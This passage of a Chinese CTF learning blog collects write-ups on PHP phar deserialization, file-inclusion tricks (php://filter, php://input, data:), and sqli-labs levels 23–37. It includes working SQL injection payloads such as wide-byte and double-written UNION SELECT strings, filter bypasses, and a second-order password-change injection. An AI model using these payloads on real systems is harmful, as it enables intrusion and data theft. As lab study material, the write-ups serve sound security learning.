//后缀为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置Stub $o = new Test(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 $phar-&gt;stopBuffering();?&gt; 用010打开文件就会发现序列化对象已被存入了phar文件当中。 而phar的攻击面是很广泛的，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，以下函数都受到了影响： 那么这里我们就可以编写程序进行反序列化漏洞的攻击了： 123456789&lt;?phpclass Test&#123; public function __destruct()&#123; echo &quot;i&#x27;m ok&quot;; &#125;&#125;$file = &#x27;phar://phar.phar/test.txt&#x27;;file_get_contents($file);?&gt; 最后我们发现触发成功。 others wait to update由于查阅了其他人写的博客发现这里面的水很深，因此在以后每碰到一种新的方式都会在这前面进行更新。 总结刷buu发现还有很多的新知识等待掌握，刷题还是很有效果的。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -php","slug":"web前端-php","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-php/"}]},{"title":"php文件包含漏洞利用","slug":"php文件包含漏洞利用","date":"2021-10-30T03:15:42.000Z","updated":"2021-10-30T07:36:07.958Z","comments":true,"path":"2021/10/30/php文件包含漏洞利用/","link":"","permalink":"http://example.com/2021/10/30/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"前言上次校赛的web3以及在做buu时都遇到了文件包含的问题，就开篇博客学习记录php文件包含漏洞的利用。","text":"前言上次校赛的web3以及在做buu时都遇到了文件包含的问题，就开篇博客学习记录php文件包含漏洞的利用。 引子[ACTF2020新生赛]include这题只是一个单纯的文件包含没什么意思，我就从[极客大挑战]secret file这题讲起 进入网页，似乎什么有用的信息也没有，直接F12用查看器查看HTML，发现了这么一行： 1&lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt; 这个页面中有一个地方隐藏着一个Oh! You found me，点击后会跳转到Archive_room.php中，但是由于颜色与背景色设置一致导致我们没法直接看到，我们可以左键鼠标拖动使其显性，也可以直接通过URL进入下一个php文件中。 进入下一个页面，这次这个秘密似乎直接贴在了我们的脸上，但是当我们点击进secret后，很快啊告诉我们查阅结束，我们F12查看后发现整个过程应该是先进入了action.php，然后再很快地跳转到了end.php中。那么我们估计关键就藏在了action.php中，那么我们对网页进行抓包： 果然，secr3t.php就藏在了action.php中，那么我们直接进入下一步，页面中出现的是一串代码： 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 相当经典的一串文件包含代码，这里用到文件包含中的php://filter，然后我们读取文件中的代码，只需要进行base64编码，这样文件就不会被执行，而是通过base64的方式返回，因为被base64编码后再传入include函数，就不会被认为是php文件，那么文件就不会执行，而是输出文件的base64编码，那么我们再进行解码即可。?file=php://filter/read=convert.base64-encode/resource=flag.php 在F12中获取base64码： 1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MDM4NzE4NTktNjVlYi00Y2ZjLTk1ZjktMDZlMmI0MTliMDI2fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 最后解码： 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;我就在这里&quot;; $flag = &#x27;flag&#123;03871859-65eb-4cfc-95f9-06e2b419b026&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 解毕 php文件包含漏洞利用看完了上面的例题，我们也能大体了解到文件包含的一些眉目了。我们要知道，include()函数对文件后缀名无要求，而对其中的语法有要求。因此无论文件格式是txt，php还是jpg等，只要内容符合的格式就可以执行。接下来详细介绍各种类型的文件包含漏洞的应用。 php://filterphp://filter可以作为一个中间流来处理其他流，可以进行任意文件的读取，这个协议可以用来过滤一些东西。我们可以设置参数： resource=&lt;要过滤的数据流&gt;：指定了你要筛选过滤的数据流。 read=&lt;读链的筛选列表&gt;：可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt;：可以设定一个或多个过滤器名称，以管道符（|）分隔 &lt;；两个链的筛选列表&gt;：任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 在校赛中用的是rot13编码，如果使用rot-13，则该方法仅限于当short_open_tag不开启的时候，而且resource的数据流也没有直接给，不过在ctf比赛中一般的数据流都是flag或者关于flag的变种形式。而这种形式的文件包含也是目前我们能见到最多的。 总之，php://filter协议有一下几个应用： 利用base64获得源码 通过读写编码实行绕过操作 php://inputphp://input的使用只需要php://input 是个可以访问请求的原始数据的只读流。POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。将要执行的语法php代码写在post中提交，不用键与值的形式，只写代码即可。因此，我们可以用这个代码查看phpinfo等更重要的页面，只需要我们POST一个完整的php语句就行了： 12?page=php://inputPOST:&lt;?php phpinfo(); ?&gt; 关于php://类型的协议在php手册中有更详细的介绍：php://input详解- Manual file://简单来说和php://filter类似，但是访问本地文件时只能传入绝对路径来读取，因此在做题时基本是完全用不上的类型。 phar:// &amp; zip://这两者都是用来查找指定压缩包内的文件，区别就在于前者可以传入绝对路径与相对路径，而后者只能传入绝对路径，且在使用后者时要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23。 data:也是可以直接传入代码，格式为：data: text/plain,&lt;?php payload ?&gt; 当然也可以使用base64编码：data:text/plain;base64,payload（编码过的）还要记得base64编码后的=与+要手动进行URL编码。 http://include也可以传入外部链接，这个可以标记以下，说不定以后有大用。 总结文件包含漏洞的应用是目前我们遇到题目中的常用解法之一，当然还有其他例如堆叠注入等等都值得我们去探索学习。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -php","slug":"web前端-php","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-php/"}]},{"title":"sqli-labs练习-less-29-37","slug":"sqli-labs练习-less-29-37","date":"2021-10-28T12:47:12.000Z","updated":"2021-10-28T15:46:39.133Z","comments":true,"path":"2021/10/28/sqli-labs练习-less-29-37/","link":"","permalink":"http://example.com/2021/10/28/sqli-labs%E7%BB%83%E4%B9%A0-less-29-37/","excerpt":"前言这几关主要练习waf与单引号过滤的绕过，其中29-31关需要配置好tomcat并开启服务，接下来开始解题","text":"前言这几关主要练习waf与单引号过滤的绕过，其中29-31关需要配置好tomcat并开启服务，接下来开始解题 less29-31三关一起写，因为除了字符型注入类型不同，其他方面几乎都是一致的。我们先看源代码： 12$qs = $_SERVER[&#x27;QUERY_STRING&#x27;];$hint=$qs; 源码中出现了$_SERVER函数，关于这个函数的具体用法可以参考本段最后的链接。中括号中的元素为’QUERY_STRING’，意思是查询字符串，如果有的话通过它进行页面访问。而我们发现这关还有一个login.php文件，这就意味着这关其实是两个服务器在进行作用。PHP手册：$_SERVER函数 那么我们来看看login.php： 123456789101112131415161718192021222324252627282930313233function whitelist($input)&#123; $match = preg_match(&quot;/^\\d+$/&quot;, $input); if($match) &#123; //echo &quot;you are good&quot;; //return $match; &#125; else &#123; header(&#x27;Location: hacked.php&#x27;); //echo &quot;you are bad&quot;; &#125;&#125;function java_implimentation($query_string)&#123; $q_s = $query_string; $qs_array= explode(&quot;&amp;&quot;,$q_s); foreach($qs_array as $key =&gt; $value) &#123; $val=substr($value,0,2); if($val==&quot;id&quot;) &#123; $id_value=substr($value,3,30); return $id_value; echo &quot;&lt;br&gt;&quot;; break; &#125; &#125;&#125; 这两个自定义函数可以说是这个php文件中的重中之重，先介绍下其中的explode()与foreach()。 explode()把字符串打散为数组，例如$str=”Hello World”在explode(“ “;$str)函数作用下就被打散成了Array([0] =&gt; Hello [1] =&gt; World) 而foreach()函数主要作用就是遍历数组，将数组被分割的数组一一输出出来。这个函数有两种语法： foreach (array_expression as $value):每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步 foreach (array_expression as $key =&gt; $value)：同语句一，同时当前单元的键名在每次循环中赋值给$key 这两个自定义函数的效果就是将语句从“&amp;”中分割开，然后再分割开的数组的前两位找id值，如果找到了就截取这个数组的第4位到30位的长度交给preg_match()进行正则匹配。 这种过滤就和相当于一个waf了，是相当强的过滤。但是结合源码我们发现，tomcat获取的是第一个数据，而处理我们想要数据的apache获取的是第二个数据。因此这题的思路就是构建payload让tomcat取得第一个数据，而我们的注入的语句从第二个语句中注入：?id=1&amp;id=0&#39;union select 1,database(),3 --+ 这样这题就解出来了，接下来就是老流程了。 less-30双引号注入，less-31双引号加括号注入，语句构建思路与29关完全一致。 less32-33&amp;36直奔32关，老规矩上源码： 12345678function check_addslashes($string)&#123; $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#x27;/\\&#x27;/i&#x27;, &#x27;\\\\\\&#x27;&#x27;, $string); //escape single quote with a backslash $string = preg_replace(&#x27;/\\&quot;/&#x27;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;&#125; 第一句的作用是搜索id中的单引号与反斜杠并用斜杠进行替代，后面两句的作用是为了防止你对反斜杠进行注释。 这里也介绍一下preg_quote()函数，这个函数的功能为向其中每个正则表达式语法中的字符前增加一个反斜线，正则表达式特殊字符如下：. \\ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : - 接着是这句代码：mysql_query(&quot;SET NAMES gbk&quot;);通过这句语句程序对对$con1进行gbk编码，关于编码的内容在我的上一篇博客进行了介绍，可供参考：学习解析Unicode与gbk编码 我们知道gbk编码中英文及符号等都是两个字符，因此我们构建payload时可以使用%aa或者%df将反斜杠给吞掉。这里分析原理：&#39;URL编码为%5c%27，在前面加上一个%aa，就构成了%aa%5c%27，在进行gbk编码后将两个字节当成了一个汉字，此时%27就被独立了出来，因此单引号就被成功注入进去了。 了解了原理，我们就能进行payload构建了：?id=-1%df&#39;union select 1,database(),3 --+ 最后愉快爆库，不过要注意，由于单引号被过滤，因此在爆表等操作时记得将’security’进行十六进制编码来绕过过滤。 less-33与32关的区别在于这关使用了addslashes()函数进行过滤操作，而上关是preg_quote()，构建payload思路与32关一致。而less-36则是使用了mysql_real_escape_string()进行过滤，本质上都没什么差别。 less-34&amp;37这两关解法一致一起写了。这关是POST注入，burp suite直接拉出来用。有人会问为什么不用hackbar呢，我们来分析一下： 首先这题依然是宽字符注入，因此我们构建payload：uname=admin%a0&#39;union select 1,database(),#&amp;passwd=1&amp;submit=Submit我们发现登录失败了，这是怎么回事呢，我们抓包来看看：uname=admin%25a0%27union+select+1%2Cdatabase%28%29%2C+%23&amp;passwd=1&amp;submit=Submit admin与a0之间多出了一个%25，这是因为在POST上传数据时，原来%a0前的那个“%”被URL编码成%25，因此我们只需要将这个25删掉就行了，当然在Requset中直接进行注入也是可以的： 同样记得在爆表等操作时记得编码，同32关一样，盲注和报错注入同样可以操作。 这里还有一个方法，�法，直接上效果： 而37关区别只是使用了mysql_real_escape_string()函数进行过滤。 less-35这关最有意思，转义了引号，结果源码的查询语句没加引号：$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 那这题就不是字符型注入了，而是数值型注入，因此我们直接构建payload，记得编码绕过过滤。这道题只能说回归初心了。 总结做到这里靶场的Page2也做完了，接下来就先做会题，然后学习sqlmap的使用。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"学习解析Unicode与gbk编码","slug":"学习解析Unicode与gbk编码","date":"2021-10-25T02:56:38.000Z","updated":"2021-10-25T15:14:14.420Z","comments":true,"path":"2021/10/25/学习解析Unicode与gbk编码/","link":"","permalink":"http://example.com/2021/10/25/%E5%AD%A6%E4%B9%A0%E8%A7%A3%E6%9E%90Unicode%E4%B8%8Egbk%E7%BC%96%E7%A0%81/","excerpt":"前言在做sqli-labs的less-32及后几关时接触到了宽字节注入，就学习了以上四种编码方式并且进行了辨析，通过这篇博客以记录下来。","text":"前言在做sqli-labs的less-32及后几关时接触到了宽字节注入，就学习了以上四种编码方式并且进行了辨析，通过这篇博客以记录下来。 从ascii开始我们都知道计算机只能识别0和1的二进制语言，因此当我们想要表示字母或者数字时需要一个规则进行转换，因此我们有了ascii字符集。但是ascii只用了7bits来表示字符，后来经过补充用8bits，这对英文来说足够了，可是世界上还有千千万万个其他文字，1个字节显然是不够的，因此，宽字符就出现了。 Unicode就起到了补充作用，事实上，Unicode对计算机全球化发展起到了巨大作用。因为各个国家之间都推出了各自的编码标准，这些标准没有一个统一值，例如gbk就是中国标准，只在中国使用，而Unicode把全球所有语言统一到了一个编码里。 Unicode与UTF-8&amp;16Unicode（UCS-2）编码遵循着中英文及其符号全部占用2个字节，如果是一个英文字母，其二进制表达为（以s为例）：00000000 01110011而一个汉字的二进制表达式为（以“日”字为例）：01100101 11100101 在Unicode字符集中，一个字符对应的一个十六进制，我们可以发现英文的二进制码前9位全部都是0，占据两个字节实在是一种浪费，这时候UTF就派上用场了。 首先是UTF-8,对于英文字母这类单字节字符，UTF-8会将字节第一位设置为0，此时这个第一个0相当于代替了9个0，因此英文字符这类的字符只占用一个字节，与ascii码值完全相同。 而对于多个字节的字符，就要转换为多字节的UTF-8，而中文在UTF-8中属于三字节。UTF-8对于n个字节的编码方式为，第一个字节的前n位用1表示，第n+1位用0表示，后面字节的前两位用10表示。 那么s与日的UTF-8编码就是如下所示：s:01110011日：11100110 10010111 10100101 是的，汉字在UTF-8中占据了3个字符，这就导致了在使用纯中文时反而消耗了更多的内存，因此对于纯中文UTF-8不是很友好。这时，我们把目光聚焦在UTF-16。 UTF-16的编码中字符一般占两个字节，因此有些人会将Unicode和UTF-16的概念混作一谈，这是错误的。但其实UTF-16编码的泛用性还是没有UTF-8广，因为UTF-16存在大小端字节序问题，容错率也更低。反观UTF-8局部的字节错误（丢失、增加、改变）不会导致连锁性的错误，因为UTF-8 的字符边界很容易检测出来。而url编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。 这里给出不同编码方式的文件头： 12345EF BB BF UTF-8FE FF UTF-16/UCS-2, little endianFF FE UTF-16/UCS-2, big endianFF FE 00 00 UTF-32/UCS-4, little endian.00 00 FE FF UTF-32/UCS-4, big-endian. 走近gbk在了解gbk之前，我们要先了解GB2312，而在了解GB2312之前，我们先认识下区位码。区位码是1980年中国制定的编码标准，每一个字符都有一个对应的四位编号，前两位为“区”，后两位为“位”，而中文汉字的区码为16。 GB2312编码正是基于区位码用双字节编码表示中文的，编码方式一般为0xA0+区号 0xA0+位号。而当编码对象是英文或数字时，一般情况下直接使用ascii编码。不过这里有个有意思的情况： 120x320xA3 0xB2 0x32自然是代表着2，那么下面那个根据GB2312编码的结果应该也为2，这两个2有什么区别呢？有，ascii码对应的2是半角字符，而GB2312编码的2是全角字符。 而gbk，即汉字国际扩展码，在GB2312的基础上进行了拓展，涵盖了Unicode中所有的汉字，因此也可以Unicode一一对应。和前面说到的GB2312不同，有的字的编码比0xA0 0xA0还小，但是其实只补充了计算机编码表，区位码是没有更新的。微软Windows安排给GBK的code page（代码页）是CP936，所以有时候看到编码格式是CP936，其实就是GBK的意思。 同一个编码文件里，高字节最高位为0则为ascii，为1则为中文。 总结学习这些编码的原理，对于我们继续进行的靶场练习可以提供一定的帮助，了解到计算机是如何编码我们的文字的，不过这也算不顾正业一回了吧。","categories":[{"name":"others","slug":"others","permalink":"http://example.com/categories/others/"}],"tags":[{"name":"-编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"sqli-lab练习-less-28及特殊不可打印字符","slug":"sqli-lab练习-less-28及特殊不可打印字符","date":"2021-10-23T03:06:28.000Z","updated":"2021-10-23T08:01:25.564Z","comments":true,"path":"2021/10/23/sqli-lab练习-less-28及特殊不可打印字符/","link":"","permalink":"http://example.com/2021/10/23/sqli-lab%E7%BB%83%E4%B9%A0-less-28%E5%8F%8A%E7%89%B9%E6%AE%8A%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6/","excerpt":"前言专门把第28关单拿出来,是因为在做题时遇到了一些问题，就拿出来单写一篇博客。 less-28先讲解题思路。通过标题提示与源码的分析，我们知道这题除了过滤注释符与空格之外，还将连续的union select给过滤了：","text":"前言专门把第28关单拿出来,是因为在做题时遇到了一些问题，就拿出来单写一篇博客。 less-28先讲解题思路。通过标题提示与源码的分析，我们知道这题除了过滤注释符与空格之外，还将连续的union select给过滤了： 12345678910$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /*$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --.$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);//Strip out spaces.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id) //Strip out spaces.$id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT.return $id; 过滤是相当严格的，不过我们已经学习了这么多注入方法，既然联合注入语句内容被过滤，我们可以使用盲注法来注入（由于报错不会回显因此不考虑报错注入）。但是我们要练习的就是绕过过滤的方法，因此我们依然采用联合查询进行注入。 关于注释符与空格的绕过上篇博客已经介绍过了，这里来介绍如何绕过对union select的过滤（单引号+括号注入）： 123?id=0&#x27;)unionunion%0aselect%0aselect%0a1,database(),3;%00?id=0&#x27;)ununion%0aselection%0aselect%0a1,database(),3;%00 这种方法是双写绕过，我们发现输入后页面在hint部分回显内容都为正常的联合查询语句，原理都是让union%0aselect被过滤，剩下的内容刚好构成一个新的union%0aselect，从而进行联合查询，当然这里的%a0可以替换为其他不可打印字符代替。 到这里我们就可以进行爆库操作了。 关于%a0分析这道题其实已经解完了，但是我们在回顾源码中关于union select的过滤语句：$id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); union的后面有一个\\s+，这就意味着所有的空格、空白符以及换行符在这里全部都被过滤了，而这个加号意味着多次匹配，因此我们也不能通过双写空格的方式来绕过。但在这其中，有一个例外：%a0 注意到这个玩意也是我发现其他人构建了一句这样的语句：?id=0&#39;)union%a0select(1),(database()),(3);%00 %a0是经过URL编码的不可打印字符，代表的是空格，按道理来说是应该要被过滤掉的，但是居然没有，相当神奇。不过我们在linux下跑php7靶场时，发现了问题： 我们想要的数据库名称居然没有正常回显，看下hint的显示，union与select之间居然出现了一个奇怪的符号，这就相当离谱了，我们回主机的靶场上跑： 翻译翻译什么叫惊喜，这就叫惊喜，hint语句出来是一样的，但是主机靶场就是不讲道理地回显了数据库名。这里我们开始做推测： linux系统下读取解析%a0结果与windows系统下结果不同，导致在linux系统下出现语法错误 php版本不同导致%a0解析结果不同 在此之前，我们首先了解到了这个%a0在此处被解析出的结果，它是空格，但又不完全是，因为如果是空格的话，例如我们使用%0a替换%a0，hint回显应该是连union select一起被过滤了，很显然这里却没有，但是在主机靶场中这个%a0又起到了空格的作用。 通过在主机另外搭建了一个php7的靶场测试，发现hint是一样的，但是没有数据库名的回显，这证明了php版本是肯定有问题的，但是第一点暂时没有证明，因为现在的linux系统只能安装php7及以上版本。 通过资料我们发现，%a0解析成空格只有在php5.2.17版本可以通过成功，目前看来应该是php版本的问题。28a采用盲注就行了，甚至28a连空格和注释符都没过滤。 总结做这题时发现了神奇的%a0，就单开了一篇博客记录下来，后面三关是waf相关的内容，用到了tomcat与apache双服务器，因此要配置tomcat。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"sqli-labs练习-less23-27","slug":"sqli-labs练习-less23-27","date":"2021-10-21T07:35:08.000Z","updated":"2021-10-21T12:38:11.366Z","comments":true,"path":"2021/10/21/sqli-labs练习-less23-27/","link":"","permalink":"http://example.com/2021/10/21/sqli-labs%E7%BB%83%E4%B9%A0-less23-27/","excerpt":"由于校赛的wp已经出来了我就不写了，把sqli-labs的坑先给填了。 less-23刷了那么多花里胡哨的关卡，又回到了熟悉的GET顿时令人倍感亲切。不过原来的倍感亲切现在变得来势汹汹，我们发现关卡标题提示我们这关过滤了注释符“#”和“–”，我们先来查看源码：","text":"由于校赛的wp已经出来了我就不写了，把sqli-labs的坑先给填了。 less-23刷了那么多花里胡哨的关卡，又回到了熟悉的GET顿时令人倍感亲切。不过原来的倍感亲切现在变得来势汹汹，我们发现关卡标题提示我们这关过滤了注释符“#”和“–”，我们先来查看源码： 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); 这行代码的原理就是检测到id中存在注释符时使用空代替，因此平常的注释方法就失效了，不过我们还有其他的方法——闭合语句法。原来我们要使用注释符是因为我们手动加上了一个单引号导致源码中单引号无法匹配，因此使用注释符将后面的单引号注释掉。不过这个方法现在行不通了，那我们就换个思路，手动闭合单引号就可以了。 我们可以使用or&#39;1或者or&#39;1&#39;=&#39;1来进行闭合，效果如下： 不过此处我们无法用单引号闭合在执行order by语句，由于order by之后需要使用数字，这里加入引号使数字转换成了字符串导致错误，我们在这里介绍另一个绕过方法，使用%00： 具体原理可以参照下面这个链接，简单来说%00截断也就是0x00，系统在读取到0x00后就会停止继续读取，从而起到过滤后面单引号的作用：0x00截断原理 不过既然是截断了，我们在构建注入语句时一定要记得加上分号，效果如下： 这样就解决了我们order by的使用问题，接下来就可以进行爆库了。 less-24一道POST题，我们发现这道题就比较复杂了，页面中有很多选项，有忘记密码，有创建账户，原页面是登录。根据标题内容提示我们这关是双重注入，我们先介绍一下双重注入： 首先我们在http请求中提交一次恶意输入使其保存进数据库中，接着我们第二次提交http请求，为了响应这次的请求程序会检索数据库中的恶意输入，成功则会返回对应结果。 了解原理后，接下来我们来审查源码，首先是index.php，一上来就是这串代码： 1234session_start();if (isset($_SESSION[&#x27;username&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;Auth&#x27;])) &#123; header(&#x27;Location: logged-in.php&#x27;);&#125; Session_start()：开始一个会话或者返回已经存在的会话，session函数保证了cookie可以在多个页面中被应用。我们继续审查，会发现几乎每个POST点都被保护的很严密，除了pass_change.php；中的username参数是直接通过session传入的，这就意味着这里存在注入点。 那么我们首先创造一个账户，用户名为admin’#。注意，字符的转义是暂时的，不会影响存入数据库中的值。 为什么我们这里要取这个名字，我们来分析更改密码的update代码：$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; 这里我们的username对应的值为admin’#,代入代码后我们得到的指令是这样的：$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;; 一目了然，username中的单引号闭合了代码中的单引号，而#起到了过滤作用，使得我们无需验证原密码也可以进行改密，接着我们就可以把admin的密码进行更改了。 没错，之前写到的admin密码123456我就是在这关改的。最后我们更改密码并登陆admin，解题成功。 less-25&amp;25a这两关本质上是一样的，放一起讲。这关的提示文字都已经贴在我们脸上告诉我们除了注释符，and和or都不能用了。那么首先，23关的%00截断法在这关仍然适用，但如果这样那就和less-23没区别了，那我们换种方法。 这个替换的原理是检测到or或者and就替换成空格，那么我们可以套娃，套一个anandd或者oorr出来，系统过滤了其中的and和or后，我们还能剩下一个and和or，要注意，只要存在and和or，不管是在单词中还是单独的，我们都需要进行套娃，例如information我们就要写成infoorrmation。 除此之外，将URL进行编码也是可以的，URL编码直接使用burp suite就可以了。如果是单独的and和or的话，我们也可以用&amp;&amp;和||替换，网上说大小写变形可以注入，但我测试了是不行的，查看源码也是说不区分大小写。 25a由于没有回显，因此使用盲注就可以了。 less-26&amp;26a现在这关向着不做人更进一步，空格也给过滤掉了，不过问题也不大，对空格的过滤我们有一套完整的解决方案： 特殊字符（%号家族）：包括但不限于%20 %09 %0a %0b %0c %0d %a0 注释：/**/ 使用括号，记得要闭合每个括号 常用的方法就是以上三者，这里使用括号来做示范：http://127.0.0.1/Less-26/?id=1%27oorr(extractvalue(1,concat(0x7e,(database()),0x7e)))aandnd%20%271%27=%271 用联合注入当然也可以。要注意，注释方法也被过滤了，而特殊字符在windows中可能出现无法被替换成空格的问题，因此在windows下建议使用括号进行绕过。 26a中采用的过滤方式为单引号+括号，且关闭了错误回显，因此只能使用盲注，具体情况和26关一样。 less-27&amp;27a这关就没有过滤and和or了，但是我们失去了union和select，同时我们发现有些过滤语句后面的反斜杠上有m或s，这是什么意思呢，这是设定的修正符，修正符的具体效果参照下面这个链接：正则表达式中的修正符 不过我们发现这里的union select可以使用混合大小写来绕过，而且源码中的正则表达式意味着只要含有就会被过滤，套娃方法在这关就失效了。同时这关的负号也被过滤了，因此id值应该GET一个例如999的数。最后进行爆库就行了。当然报错与盲注一样都是可以的。 27a同样是没有报错，与27没有什么差别，盲注就行了。 总结先写到27关，因为在做28关时发现了linux与windows靶场使用同一个注入方式，linux无法显示而windows正常回显的情况，初步猜测是php版本不同导致的问题，等下回继续研究。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"攻防世界","slug":"攻防世界","date":"2021-10-17T08:19:20.000Z","updated":"2021-10-17T13:36:46.969Z","comments":true,"path":"2021/10/17/攻防世界/","link":"","permalink":"http://example.com/2021/10/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/","excerpt":"前言由于要准备校赛这周就没有刷sqli靶场了，这篇文章主要写攻防世界中web的部分新手题和进阶题，等校赛环境开了就把校赛的wp写了，下周继续刷靶场。","text":"前言由于要准备校赛这周就没有刷sqli靶场了，这篇文章主要写攻防世界中web的部分新手题和进阶题，等校赛环境开了就把校赛的wp写了，下周继续刷靶场。 command_execution这题难度不是很高，但在web新手题里应该算是最难的了，这题要求我们运用到linux常用指令。不过在这之前，先简单说下提示中的waf，waf为web提供保护，可以有效防护sql注入等等手段，可以和防火墙结合起来一起理解。 接着我们再介绍linux的命令执行中的“&amp;”和“|”的作用： 1234c1 &amp;&amp; c2 先执行c1再执行c2c1 &amp; c2 先执行c2后执行c1c1 || c2 c1执行失败后执行c2，反之不执行c2c1 | c2 只执行c2 除了这些，我们还得了解linux基本指令。这题我们使用了ls指令和cat指令： 12ls 查看目录文件cat 读取文件 了解了这些，我们就可以解题了。我们直接查找当前目录下的文件： 就像这样，我们一级一级往上查找，找到根目录后进入home中，我们就可以发现flag就躺在里面，用cat指令打开查看就好了。 